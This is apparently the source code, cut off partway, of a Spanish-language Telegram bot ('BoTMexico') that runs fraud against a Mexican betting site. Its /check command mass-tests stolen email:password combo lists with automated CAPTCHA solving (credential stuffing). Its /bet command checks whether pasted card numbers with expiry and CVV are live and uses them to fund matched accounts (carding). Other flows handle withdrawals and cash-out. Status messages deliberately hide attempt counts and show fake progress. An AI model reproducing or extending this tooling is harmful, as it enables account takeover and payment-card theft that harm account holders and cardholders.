"""Telegram Bot Mock — Versión simplificada y desacoplada del bot de Telegram.
Implementa únicamente los comandos requeridos: /start, /help, /cancel, /botmex, /check y /bet.
Usa la misma BD compartida y los motores de login / matchmaking del dashboard.
"""

import asyncio
import json
import os
import random
import sys
import time
from pathlib import Path
from typing import List, Dict, Any, Tuple, Optional

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BotCommand,
    BotCommandScopeChat,
)
from telegram.request import HTTPXRequest
from telegram.error import NetworkError, TimedOut, Conflict
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
    ConversationHandler,
)

# Permitir imports directos desde el directorio del bot
_MOCK_DIR = Path(__file__).parent.resolve()
if str(_MOCK_DIR) not in sys.path:
    sys.path.insert(0, str(_MOCK_DIR))

try:
    from telegram_bot_mock.config import (
        logger,
        MOCK_BOT_TOKEN,
        DASHBOARD_URL,
        SUPERADMIN_ID,
        is_authorized,
        DB_PATH,
        HEADER_LOCKUP,
        get_user_nickname,
    )
except ImportError:
    from config import (
        logger,
        MOCK_BOT_TOKEN,
        DASHBOARD_URL,
        SUPERADMIN_ID,
        is_authorized,
        DB_PATH,
        HEADER_LOCKUP,
        get_user_nickname,
    )

# Imports del dashboard & bot core
from app import filter_and_sanitize_check_combos, db, _persist_auto_mission
from login_orchestrator import gentle_login
from prewarm import (
    _db_upsert_balance,
    _db_save_txns_and_recalc,
    _db_mark_dead,
    _fetch_looks_empty,
)
from card_checker import precheck_card_liveness, format_ruthopia_liveness_summary
from auto_deposit import plan_auto_mission, run_auto_mission
from deposits import _mission_sem
from clabe_fetch import get_saved_clabes, fetch_clabes_from_betmexico, _persist_clabes, _load_jwt_for_account, _get_admin_proxy_url
from withdrawals import (
    get_bank_accounts,
    get_real_balance,
    execute_withdrawal,
    execute_auto_batch_withdrawal,
    NoApprovedWithdrawalAccount,
    InsufficientBalance,
    JwtExpired,
)
from bin_intelligence import (
    fetch_operator_personal_stats,
    format_telegram_operator_stats,
)


# Membrete Oficial BoTMexico
HEADER_DECORATIVE = (
    "═════════════════════════\n"
    "🇲🇽  🌵 · <b><code>ʙ ᴏ ᴛ · ᴍ ᴇ x ɪ ᴄ ᴏ</code></b> · 🌵  🇲🇽\n"
    "═════════════════════════"
)

HEADER = HEADER_DECORATIVE

# Estados de Conversación
(
    WAIT_CHECK_CONFIRM,
    WAIT_BET_CONFIRM,
    WAIT_ADDUSER_INPUT,
    WAIT_BANK_ACCESS_INPUT,
) = range(4)


# Eventos de confirmación en espera para /bet confirm_gate
_confirm_events: Dict[str, Tuple[asyncio.Event, Dict[str, Any]]] = {}

# Misiones cerradas por el gate (stop_sched_) — evita que on_progress
# sobrescriba el mensaje limpio de cancelación con el texto terminal leaky.
_gate_closed_missions: set = set()

# Diccionarios de tracking de procesos activos para multitarea del operador
# operator_id -> mission_id / info de misión activa
_active_operator_missions: Dict[int, Dict[str, Any]] = {}
# operator_id -> withdrawal_id / info de retiro activo
_active_operator_withdrawals: Dict[int, Dict[str, Any]] = {}
# operator_id -> info de ficha SPEI pendiente de pago
_pending_spei_fundings: Dict[int, Dict[str, Any]] = {}


def resolve_mission_confirm_gate(mission_id: str, decision: bool) -> bool:
    """Resuelve programáticamente el confirm_gate de una misión (desde bot o portal)."""
    item = _confirm_events.get(mission_id)
    if not item:
        return False
    ev, state = item
    state["decision"] = bool(decision)
    ev.set()
    return True


def _ascii_bar(pct: int, width: int = 10) -> str:
    """Genera una barra de progreso ASCII estilizada [■■■■□□□□□□]."""
    filled = int((max(0, min(100, pct)) / 100.0) * width)
    return "■" * filled + "□" * (width - filled)


def _mission_status_text(status: str, extra: dict) -> str:
    """Retorna texto de status bajo protocolo de seguridad anti-fuga (sin exponer conteo de intentos ni cadencia de pasarela)."""
    fake_pct = extra.get("fake_pct", 0)
    bar = _ascii_bar(fake_pct)

    if status == "matching":
        return (
            f"🔍 <b>Rastreando cuenta en pool (KYC Verificado / Grado A+)…</b>\n"
            f"  <code>[{bar}] {fake_pct}%</code>"
        )
    elif status == "logging_in":
        email = extra.get("email", "")
        return f"🔑 <b>Verificando sesión segura:</b> <code>{email}</code>"
    elif status == "match":
        email = extra.get("email", "")
        return f"🎯 <b>Cuenta enlazada:</b> <code>{email}</code>"
    elif status == "awaiting_confirmation":
        return "⚠️ <b>Cuenta vinculada. Lista para acreditación de fondos.</b>"
    elif status == "preparing":
        return (
            f"⚡ <b>Preparando acreditación en segundo plano…</b>\n"
            f"  <code>[{bar}] {fake_pct}%</code>"
        )
    elif status == "scheduling":
        return (
            f"⚡ <b>Procesando depósitos en segundo plano…</b>\n"
            f"  <code>[{bar}] {fake_pct}%</code>"
        )
    elif status == "completed":
        if extra.get("stopped_by_user"):
            return "🛑 <b>Detenido por el operador antes de la acreditación.</b>"
        dep = extra.get("deposited", 0)
        return f"✅ <b>Proceso completado exitosamente.</b> Total acreditado: <b>${dep:.0f}</b>."
    elif status == "cancelled":
        return "🛑 <b>Detenido por el operador</b>"
    elif status == "failed":
        return "❌ No se encontró match viable."
    else:
        return f"⏳ <b>Estado:</b> {status}"


# ─────────────────────────────────────────────────────────────────────
# COMANDOS BÁSICOS (Estilo BoTMexico)
# ─────────────────────────────────────────────────────────────────────


def _logo_path() -> Path:
    return Path(__file__).resolve().parent.parent / "static" / "assets" / "botmexico_logo_new.png"


def _start_menu_msg(user_id: int, nickname: str):
    """Construye mensaje + teclado del menú principal (/start y 'Volver al inicio')."""
    msg = (
        f"{HEADER}\n\n"
        f"• 👤 <b>Operador:</b> <code>{nickname}</code>\n"
        f"• 🆔 <b>ID:</b> <code>{user_id}</code>\n"
        f"• 🌐 <b>Portal:</b> <code>botmexico.net</code>"
    )
    buttons = []
    if user_id in _active_operator_missions or user_id in _active_operator_withdrawals or user_id in _pending_spei_fundings:
        buttons.append([InlineKeyboardButton("⚡ Ver Proceso Activo", callback_data="btn_start_active_process")])

    buttons.extend([
        [InlineKeyboardButton("💳 CC Auto-Match (/bet)", callback_data="btn_start_bet")],
        [InlineKeyboardButton("🔑 Check Combos (/check)", callback_data="btn_start_check")],
        [InlineKeyboardButton("📊 Mi Rendimiento", callback_data="btn_start_operator_stats")],
        [InlineKeyboardButton("❔ Manual & Ayuda", callback_data="btn_start_help")],
        [InlineKeyboardButton("🌐 Portal Web", url=DASHBOARD_URL)],
    ])
    kb = InlineKeyboardMarkup(buttons)
    return msg, kb


async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /start — Entrada con membrete oficial, logo, saludo dinámico por apodo, ID y rap sátira."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text(
            f"{HEADER}\n\nAcceso denegado.", parse_mode="HTML"
        )
        return

    nickname = get_user_nickname(user_id, update.effective_user.first_name)
    msg, kb = _start_menu_msg(user_id, nickname)

    try:
        with open(_logo_path(), "rb") as f:
            await update.message.reply_photo(
                photo=f, caption=msg, parse_mode="HTML", reply_markup=kb
            )
    except FileNotFoundError:
        await update.message.reply_text(msg, parse_mode="HTML", reply_markup=kb)


async def _edit_msg(query, text: str, reply_markup=None):
    """Edita el mensaje del callback: usa edit_message_caption si el mensaje
    original tiene foto (el /start envía foto+caption), sino edit_message_text.

    Fixes 'There is no text in the message to edit' cuando se toca un botón
    del /start (mensaje con media).

    Si el texto excede 1024 chars (límite Telegram para captions) y el mensaje
    tiene foto, elimina el viejo y envía uno nuevo como texto."""
    TG_CAPTION_LIMIT = 1024
    if query.message and query.message.photo:
        if len(text) <= TG_CAPTION_LIMIT:
            await query.edit_message_caption(
                caption=text, parse_mode="HTML", reply_markup=reply_markup
            )
        else:
            # Texto excede límite de caption — eliminar mensaje con foto y
            # enviar nuevo mensaje de texto para no colgar el handler.
            chat_id = query.message.chat_id
            try:
                await query.message.delete()
            except Exception:
                # Si no se puede borrar (permisos), al menos quitar botones
                try:
                    await query.edit_message_reply_markup(reply_markup=None)
                except Exception:
                    pass
            await query.message.chat.send_message(
                text=text, parse_mode="HTML", reply_markup=reply_markup
            )
    else:
        await query.edit_message_text(
            text=text, parse_mode="HTML", reply_markup=reply_markup
        )


async def start_buttons_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Callback para botones rápidos del /start."""
    query = update.callback_query
    await query.answer()
    if query.data == "btn_start_bin_radar":
        radar_text = format_telegram_radar_full()
        kb = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("💳 Tirar con Bines TOP (/bet)", callback_data="btn_start_bet")],
                [InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")],
            ]
        )
        await _edit_msg(
            query,
            f"{HEADER}\n\n{radar_text}",
            reply_markup=kb,
        )
        return ConversationHandler.END
    elif query.data == "btn_start_operator_stats":
        user_id = update.effective_user.id
        nickname = get_user_nickname(user_id, update.effective_user.first_name)
        stats = fetch_operator_personal_stats(user_id, DB_PATH)
        stats_text = format_telegram_operator_stats(stats, nickname)
        kb = InlineKeyboardMarkup(
            [
                [InlineKeyboardButton("💳 Tirar CCs (/bet)", callback_data="btn_start_bet")],
                [InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")],
            ]
        )
        await _edit_msg(
            query,
            f"{HEADER}\n\n{stats_text}",
            reply_markup=kb,
        )
        return ConversationHandler.END
    elif query.data == "btn_start_active_process":
        user_id = update.effective_user.id
        active_m = _active_operator_missions.get(user_id)
        active_w = _active_operator_withdrawals.get(user_id)
        pending_s = _pending_spei_fundings.get(user_id)

        if not active_m and not active_w and not pending_s:
            kb = InlineKeyboardMarkup(
                [[InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")]]
            )
            await _edit_msg(
                query,
                f"{HEADER}\n\n"
                "ℹ️ <b>Sin procesos activos en este momento.</b>\n"
                "No tienes misiones ni retiros en curso.",
                reply_markup=kb,
            )
            return ConversationHandler.END

        # Mostrar el status del proceso activo prioritario
        if active_w:
            w_id = active_w.get("withdrawal_id", "N/A")
            email = active_w.get("email", "N/A")
            pct = active_w.get("pct", 0)
            withdrawn = active_w.get("withdrawn", 0.0)
            total = active_w.get("total", 0.0)
            bar = _ascii_bar(pct)

            kb = InlineKeyboardMarkup(
                [
                    [InlineKeyboardButton("🔄 Actualizar Vista", callback_data="btn_start_active_process")],
                    [InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")],
                ]
            )
            await _edit_msg(
                query,
                f"{HEADER}\n\n"
                f"💸 <b>RETIRO AUTOMÁTICO EN CURSO</b>\n\n"
                f"• 👤 Cuenta: <code>{email}</code>\n"
                f"• 📊 Avance: <code>[{bar}] {pct}%</code>\n"
                f"• 💰 Retirado: <b>${withdrawn:,.2f}</b> / ${total:,.2f}\n"
                f"• ⚡ Estado: Dispersando en batches seguros.\n\n"
                f"🇲🇽 <i>Puedes volver al menú sin interrumpir la operación.</i>",
                reply_markup=kb,
            )
            return ConversationHandler.END

        if pending_s:
            email = pending_s.get("email", "")
            clabe_stp = pending_s.get("clabe_stp", "")
            curp = pending_s.get("curp", "")
            m_id = pending_s.get("mission_id", "")

            kb = InlineKeyboardMarkup(
                [
                    [InlineKeyboardButton("✅ Ya mandé el SPEI", callback_data=f"verify_spei_{m_id}")],
                    [InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")],
                ]
            )
            await _edit_msg(
                query,
                f"{HEADER}\n\n"
                f"📑 <b>FICHA DE FONDEO SPEI PENDIENTE</b>\n\n"
                f"• 👤 Cuenta: <code>{email}</code>\n"
                f"• 🏦 CLABE STP: <code>{clabe_stp}</code>\n"
                f"• 🆔 CURP Titular: <code>{curp}</code>\n"
                f"• 💵 Monto requerido: <b>$10.00 MXN</b>\n\n"
                f"<i>(Toca sobre la CLABE o CURP para copiar rápido)</i>\n\n"
                f"👉 <i>Una vez enviado, presiona 'Ya mandé el SPEI' para validar y habilitar tu retiro.</i>",
                reply_markup=kb,
            )
            return ConversationHandler.END

        if active_m:
            m_id = active_m.get("mission_id", "N/A")

            kb = InlineKeyboardMarkup(
                [
                    [InlineKeyboardButton("🔄 Actualizar Vista", callback_data="btn_start_active_process")],
                    [InlineKeyboardButton("🛑 Detener Misión", callback_data=f"stop_mission_{m_id}")],
                    [InlineKeyboardButton("🏠 Volver al inicio", callback_data="btn_start_cancel")],
                ]
            )
            await _edit_msg(
                query,
                f"{HEADER}\n\n"
                f"🎯 <b>MISIÓN {m_id} EN EJECUCIÓN</b>\n\n"
                f"• ⚡ Estado: Procesando depósitos en segundo plano.\n\n"
                f"🇲🇽 <i>Puedes volver al menú principal sin que se cancele la misión.</i>",
                reply_markup=kb,
            )
            return ConversationHandler.END

    elif query.data == "btn_start_bet":
        kb = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🏠 Volver al inicio", callback_data="btn_start_cancel"
                    )
                ]
            ]
        )
        await _edit_msg(
            query,
            f"{HEADER}\n\n"
            "💳 <b>Auto Depósito · CC Auto-Match (/bet)</b>\n\n"
            "Pega tus tarjetas en formato estándar:\n"
            "<code>4111111111111111|12|28|123</code>\n\n"
            "• 1 a 4 tarjetas por intento (una por línea).\n"
            "• Matching automático con cuentas verificadas (A+ / KYC).\n"
            "• Validación liveness en tiempo real.",
            reply_markup=kb,
        )
        return WAIT_BET_CONFIRM
    elif query.data == "btn_start_check":
        kb = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🏠 Volver al inicio", callback_data="btn_start_cancel"
                    )
                ]
            ]
        )
        await _edit_msg(
            query,
            f"{HEADER}\n\n"
            "📥 <b>Verificación de Accesos y Combos (/check)</b>\n\n"
            "Envía combos en chat (máx 100) o archivo .txt (máx 5,000):\n"
            "<code>correo:contraseña</code>\n\n"
            "• Validación silenciosa sin alterar saldo.\n"
            "• Calificación automática de perfiles y grado.",
            reply_markup=kb,
        )
        return WAIT_CHECK_CONFIRM
    elif query.data == "btn_start_help":
        msg = (
            f"{HEADER}\n\n"
            "<b>Manual Operativo BoTMexico:</b>\n\n"
            "• <b>/bet</b> — 💳 CC Auto-Match\n"
            "  Pega 1 a 4 tarjetas <code>num|mm|yy|cvv</code> (o escribe <code>/bet &lt;tarjetas&gt;</code> directo).\n\n"
            "• <b>/check</b> — 🔑 Check Combos/Accesos\n"
            "  Envía combos <code>correo:pass</code> en chat (máx 100) o adjunta <code>.txt</code> (máx 5,000).\n\n"
            "• <b>/botmex</b> — 🇲🇽 botmexico.net (Dashboard)\n"
            "  Enlace directo al Dashboard de Operador.\n\n"
            "• <b>/help</b> — ❔ Ayuda\n"
            "  Muestra esta guía rápida.\n\n"
            "• <b>/cancel</b> — 🛑 Cancelar proceso\n"
            "  Cancela misiones activas y libera cuentas.\n"
        )
        kb = InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "💳 CC Auto-Match", callback_data="btn_start_bet"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "🏠 Volver al inicio", callback_data="btn_start_cancel"
                    )
                ],
                [
                    InlineKeyboardButton(
                        "🇲🇽 botmexico.net (Dashboard)", url=DASHBOARD_URL
                    )
                ],
            ]
        )
        await _edit_msg(query, msg, reply_markup=kb)
    elif query.data == "btn_start_cancel":
        user_id = update.effective_user.id
        # Limpiar estados transitorios pero preservar procesos activos en segundo plano
        context.user_data.pop("pending_check", None)
        context.user_data.pop("filtered_summary", None)
        context.user_data.pop("pending_bet_pipes", None)
        context.user_data.pop("pending_tol_pipes", None)
        context.user_data.pop("pending_bank_access", None)
        nickname = get_user_nickname(user_id, update.effective_user.first_name)
        home_msg, home_kb = _start_menu_msg(user_id, nickname)
        await _edit_msg(query, home_msg, reply_markup=home_kb)
        return ConversationHandler.END


async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /help — Guía rápida con membrete oficial y jerga de operador."""
    msg = (
        f"{HEADER}\n\n"
        "<b>Manual Operativo BoTMexico:</b>\n\n"
        "• <b>/bet</b> — 💳 CC Auto-Match\n"
        "  Pega 1 a 4 tarjetas <code>num|mm|yy|cvv</code> (o escribe <code>/bet &lt;tarjetas&gt;</code> directo).\n"
        "  <i>Valida liveness vía Ruthopia gate, hace match y liquida de una.</i>\n\n"
        "• <b>/check</b> — 🔑 Check Combos/Accesos\n"
        "  Envía combos <code>correo:pass</code> en chat (máx 100) o adjunta <code>.txt</code> (máx 5,000).\n"
        "  <i>Valida balance y estado sin tocar saldo ni quemar cuentas.</i>\n\n"
        "• <b>/botmex</b> — 🇲🇽 botmexico.net (Dashboard)\n"
        "  Enlace directo al núcleo del Dashboard de Operador.\n\n"
        "• <b>/help</b> — ❔ Ayuda\n"
        "  Muestra esta guía rápida de instrucciones.\n\n"
        "• <b>/cancel</b> — 🛑 Cancelar/Detener proceso\n"
        "  Cancela cualquier misión activa y libera cuentas de inmediato.\n"
    )
    kb = InlineKeyboardMarkup(
        [
            [InlineKeyboardButton("💳 CC Auto-Match", callback_data="btn_start_bet")],
            [
                InlineKeyboardButton(
                    "🏠 Volver al inicio", callback_data="btn_start_cancel"
                )
            ],
            [InlineKeyboardButton("🇲🇽 botmexico.net (Dashboard)", url=DASHBOARD_URL)],
        ]
    )
    await update.message.reply_text(msg, parse_mode="HTML", reply_markup=kb)


async def botmex_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /botmex."""
    kb = InlineKeyboardMarkup(
        [[InlineKeyboardButton("🌐 Entrar al Portal", url=DASHBOARD_URL)]]
    )
    await update.message.reply_text(
        f"{HEADER}\n\n"
        f"Acceso directo al portal web:\n<code>{DASHBOARD_URL}</code>",
        parse_mode="HTML",
        reply_markup=kb,
    )


async def cancel_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Comando /cancel — Aborta misiones y limpia estado de conversación."""
    user_id = update.effective_user.id

    with db(write=True) as c:
        c.execute(
            "UPDATE auto_missions SET status='cancelled' "
            "WHERE operator_id=? AND status IN ('pending', 'running', 'paused')",
            (user_id,),
        )

    _active_operator_missions.pop(user_id, None)
    _active_operator_withdrawals.pop(user_id, None)
    _pending_spei_fundings.pop(user_id, None)
    context.user_data.clear()

    nickname = get_user_nickname(user_id, update.effective_user.first_name)
    _, home_kb = _start_menu_msg(user_id, nickname)

    await update.message.reply_text(
        f"{HEADER}\n\n🛑 <b>Proceso abortado.</b>\nOperaciones detenidas y liberadas limpiamente.",
        parse_mode="HTML",
        reply_markup=home_kb,
    )
    return ConversationHandler.END


# ─────────────────────────────────────────────────────────────────────
# FLUJO /ADDUSER
# ─────────────────────────────────────────────────────────────────────

async def adduser_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Punto de entrada /adduser — exclusivo Superadmin."""
    user_id = update.effective_user.id
    if user_id != SUPERADMIN_ID:
        await update.message.reply_text("❌ Comando exclusivo para Superadmin.")
        return ConversationHandler.END

    args = context.args or []
    if len(args) >= 2:
        # Formato directo: /adduser <ID> <Apodo> [rol]
        tg_id_str, nickname = args[0], args[1]
        role = args[2].lower() if len(args) >= 3 else "operator"
        try:
            tg_id = int(tg_id_str)
            from auth import add_user
            u = add_user(nickname, tg_id, role)
            await update.message.reply_text(
                f"✅ <b>Usuario registrado con éxito</b>\n\n"
                f"• <b>Apodo:</b> {u['display']}\n"
                f"• <b>Telegram ID:</b> <code>{u['telegram_id']}</code>\n"
                f"• <b>Rol:</b> {u['role']}\n\n"
                f"<i>Al ingresar a la web por primera vez con el usuario <b>{u['display']}</b>, se le pedirá definir contraseña.</i>",
                parse_mode="HTML",
            )
            return ConversationHandler.END
        except ValueError:
            await update.message.reply_text("❌ ID inválido. Debe ser numérico.")
            return ConversationHandler.END

    await update.message.reply_text(
        "👤 <b>REGISTRAR NUEVO USUARIO</b>\n\n"
        "Envía los datos del usuario en el siguiente formato:\n"
        "<code>ID Apodo [rol]</code>\n\n"
        "<b>Ejemplo:</b>\n"
        "<code>7847239854 Luisito operator</code>\n"
        "<code>1234567890 Pedro admin</code>\n\n"
        "<i>Roles válidos: operator (defecto), admin, superadmin.</i>",
        parse_mode="HTML",
    )
    return WAIT_ADDUSER_INPUT


async def process_adduser_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Procesa el texto ingresado para /adduser."""
    user_id = update.effective_user.id
    if user_id != SUPERADMIN_ID:
        await update.message.reply_text("❌ No autorizado.")
        return ConversationHandler.END

    text = (update.message.text or "").strip()
    parts = text.split()
    if len(parts) < 2:
        await update.message.reply_text(
            "⚠️ Formato incorrecto. Envía: <code>ID Apodo [rol]</code> (Ej: <code>7847239854 Luisito operator</code>)",
            parse_mode="HTML",
        )
        return WAIT_ADDUSER_INPUT

    tg_id_str, nickname = parts[0], parts[1]
    role = parts[2].lower() if len(parts) >= 3 else "operator"

    try:
        tg_id = int(tg_id_str)
    except ValueError:
        await update.message.reply_text("❌ El ID de Telegram debe ser un número.")
        return WAIT_ADDUSER_INPUT

    from auth import add_user
    u = add_user(nickname, tg_id, role)
    await update.message.reply_text(
        f"✅ <b>Usuario registrado con éxito</b>\n\n"
        f"• <b>Apodo:</b> {u['display']}\n"
        f"• <b>Telegram ID:</b> <code>{u['telegram_id']}</code>\n"
        f"• <b>Rol:</b> {u['role']}\n\n"
        f"<i>Al ingresar a la web por primera vez con el usuario <b>{u['display']}</b>, se le pedirá definir contraseña.</i>",
        parse_mode="HTML",
    )
    return ConversationHandler.END


async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Punto de entrada para /check — Recibe texto o archivo .txt."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ No autorizado.")
        return ConversationHandler.END

    await update.message.reply_text(
        "📥 <b>ENVÍA LOS COMBOS A VERIFICAR</b>\n\n"
        "• Pegados en chat: Máximo 100 líneas.\n"
        "• Archivo .txt: Adjunta el documento (máximo 5,000 líneas).\n\n"
        "<i>Formato: correo:contraseña (opcional :tarjeta|mm|yy|cvv)</i>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🏠 Volver al inicio", callback_data="cancel_check"
                    )
                ]
            ]
        ),
    )
    return WAIT_CHECK_CONFIRM


async def process_check_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Procesa el texto o documento enviado para /check."""
    user_id = update.effective_user.id
    combos = []

    if update.message.document:
        doc = update.message.document
        if not doc.file_name.endswith(".txt"):
            await update.message.reply_text(
                "❌ Solo se admiten archivos con extensión .txt"
            )
            return WAIT_CHECK_CONFIRM

        file_obj = await context.bot.get_file(doc.file_id)
        content_bytes = await file_obj.download_as_bytearray()
        try:
            text_content = content_bytes.decode("utf-8", errors="ignore")
        except Exception:
            text_content = content_bytes.decode("latin-1", errors="ignore")

        combos = [line.strip() for line in text_content.splitlines() if line.strip()]
        if len(combos) > 5000:
            await update.message.reply_text(
                "❌ El archivo supera el límite de 5,000 líneas."
            )
            return WAIT_CHECK_CONFIRM

    elif update.message.text:
        text = update.message.text.strip()
        if text.startswith("/"):
            await update.message.reply_text(
                "❌ Envía la lista de combos, no un comando."
            )
            return WAIT_CHECK_CONFIRM
        combos = [line.strip() for line in text.splitlines() if line.strip()]
        if len(combos) > 100:
            await update.message.reply_text(
                "❌ Máximo 100 combos en chat. Para más, adjunta un archivo .txt (hasta 5,000)."
            )
            return WAIT_CHECK_CONFIRM

    if not combos:
        await update.message.reply_text("❌ No se encontraron combos en la entrada.")
        return WAIT_CHECK_CONFIRM

    filtered = filter_and_sanitize_check_combos(combos)
    valid_list = filtered["valid_combos"]

    if not valid_list:
        summary_msg = (
            f"<b>❌ NINGÚN COMBO SUPERÓ LAS VALIDACIONES</b>\n\n"
            f"• <b>Recibidos:</b> {filtered['total_received']}\n"
            f"• <b>Duplicados:</b> {filtered['dupes_count']}\n"
            f"• <b>Ya existen en BD (Correo):</b> {len(filtered['in_db_emails'])}\n"
            f"• <b>Ya existen en BD (Tarjeta):</b> {len(filtered['in_db_cards'])}\n"
            f"• <b>Tarjetas Inválidas / Luhn:</b> {len(filtered['invalid_cards'])}\n\n"
            f"💡 <i>Las cuentas omitidas se pueden consultar en {DASHBOARD_URL}</i>"
        )
        await update.message.reply_text(summary_msg, parse_mode="HTML")
        return ConversationHandler.END

    # Guardar en context para la confirmación
    context.user_data["pending_check"] = valid_list
    context.user_data["filtered_summary"] = filtered

    confirm_msg = (
        f"<b>⚠️ CONFIRMACIÓN DE CHECK SOLICITADA</b>\n\n"
        f"• <b>Total Recibidos:</b> {filtered['total_received']}\n"
        f"• <b>Duplicados Omitidos:</b> {filtered['dupes_count']}\n"
        f"• <b>Ya en BD (Omitidos):</b> {len(filtered['in_db_emails']) + len(filtered['in_db_cards'])}\n"
        f"• <b>Tarjetas Inválidas:</b> {len(filtered['invalid_cards'])}\n"
        f"• <b>Nuevos a Verificar:</b> <b>{len(valid_list)}</b>\n\n"
        f"<i>¿Deseas iniciar la verificación?</i>"
    )
    kb = InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("✅ Iniciar Check", callback_data="confirm_check"),
                InlineKeyboardButton(
                    "🏠 Volver al inicio", callback_data="cancel_check"
                ),
            ]
        ]
    )
    await update.message.reply_text(confirm_msg, parse_mode="HTML", reply_markup=kb)
    return WAIT_CHECK_CONFIRM


async def handle_check_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja los botones de confirmación de /check."""
    query = update.callback_query
    await query.answer()

    if query.data == "cancel_check":
        context.user_data.pop("pending_check", None)
        await query.edit_message_text("❌ Verificación /check cancelada.")
        return ConversationHandler.END

    if query.data == "confirm_check":
        valid_combos = context.user_data.get("pending_check", [])
        if not valid_combos:
            await query.edit_message_text("❌ No hay combos pendientes.")
            return ConversationHandler.END

        await query.edit_message_text(
            f"🚀 <b>Iniciando /check para {len(valid_combos)} combo(s)...</b>",
            parse_mode="HTML",
        )

        # Ejecución asíncrona de verificación
        asyncio.create_task(
            _run_check_task(
                query.message.chat_id,
                context.bot,
                valid_combos,
                update.effective_user.id,
            )
        )
        return ConversationHandler.END


async def _run_check_task(
    chat_id: int, bot, valid_combos: List[Dict[str, Any]], operator_id: int
):
    """Ejecuta el ciclo de gentle_login + balance check para cada combo válido."""
    cap_key = os.environ.get("CAPMONSTER_KEY", "") or os.environ.get(
        "BMX_CAPMONSTER_KEY", ""
    )

    from betmexico_login_service import make_pool

    pool = make_pool(cap_key, size=2, workers=1) if cap_key else None

    hits_count = 0
    dead_count = 0
    errors_count = 0
    total = len(valid_combos)

    status_msg = await bot.send_message(
        chat_id=chat_id,
        text=f"⏳ <b>Progreso Check:</b> 0/{total} procesados...",
        parse_mode="HTML",
    )

    try:
        from betmexico_login_api import BetmexicoApiChecker

        for idx, item in enumerate(valid_combos, 1):
            email = item["email"]
            password = item["password"]
            card_pipe = item.get("card_pipe", "")

            login_res = await gentle_login(
                email,
                password,
                max_login_retries=3,
                throttle=True,
                pool=pool,
                use_cache=True,
            )

            if login_res.ok and login_res.jwt:
                jwt = login_res.jwt
                async with BetmexicoApiChecker() as checker:
                    try:
                        details = await asyncio.wait_for(
                            checker.fetch_account_details_parallel(
                                jwt, fetch_mode="balance_only"
                            ),
                            timeout=15.0,
                        )
                    except Exception:
                        details = None

                if details and not _fetch_looks_empty(details):
                    _db_upsert_balance(email, details)
                    _db_save_txns_and_recalc(
                        email, details, operator_id
                    )
                    hits_count += 1
                else:
                    hits_count += 1
            elif login_res.account_dead:
                _db_mark_dead(email, f"Check Login Failed: {login_res.error}")
                dead_count += 1
            else:
                errors_count += 1

            if idx % 2 == 0 or idx == total:
                try:
                    await status_msg.edit_text(
                        f"⏳ <b>Progreso Check:</b> {idx}/{total} procesados...\n"
                        f"• Hits: <b>{hits_count}</b> | Dead: <b>{dead_count}</b> | Errors: <b>{errors_count}</b>",
                        parse_mode="HTML",
                    )
                except Exception:
                    pass

        final_text = (
            f"<b>✅ VERIFICACIÓN /CHECK FINALIZADA</b>\n\n"
            f"• <b>Total Procesados:</b> {total}\n"
            f"• <b>Cuentas Vivas (HITS):</b> {hits_count}\n"
            f"• <b>Cuentas Muertas (DEAD):</b> {dead_count}\n"
            f"• <b>Errores de Red / Captcha:</b> {errors_count}\n\n"
            f"🌐 <i>Consulta detalles completos en el dashboard web.</i>"
        )
        await bot.send_message(chat_id=chat_id, text=final_text, parse_mode="HTML")
    except Exception as ex:
        logger.error(
            f"[Check] Error inesperado en _run_check_task: {ex}", exc_info=True
        )
        await bot.send_message(chat_id=chat_id, text=f"❌ Error durante el check: {ex}")
    finally:
        if pool:
            await pool.stop()


# ─────────────────────────────────────────────────────────────────────
# FLUJO /BET & AUTO-MATCHING
# ─────────────────────────────────────────────────────────────────────


async def _animate_loading_dots(message, base_text: str, total_seconds: float = 10.0):
    """Anima puntos suspensivos en el mensaje de feedback durante N segundos."""
    dots = [".  ", ".. ", "..."]
    end_time = time.time() + total_seconds
    idx = 0
    while time.time() < end_time:
        dot_str = dots[idx % len(dots)]
        idx += 1
        try:
            await message.edit_text(
                f"{base_text}\n\n  Espera{dot_str}", parse_mode="HTML"
            )
        except Exception:
            pass
        await asyncio.sleep(0.8)


async def bet_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Punto de entrada para /bet — Solicita tarjetas o procesa si venían en args."""
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ No autorizado.")
        return ConversationHandler.END

    # Verificar si el usuario envió tarjetas directamente junto al comando: /bet 4111...|12|28|123
    args = context.args
    if args:
        raw_text = " ".join(args)
        return await process_bet_input(update, context, override_text=raw_text)

    msg = (
        f"{HEADER}\n\n"
        "💳 <b>Auto Depósito · CC Auto-Match (/bet)</b>\n\n"
        "Pega tus tarjetas en formato estándar:\n"
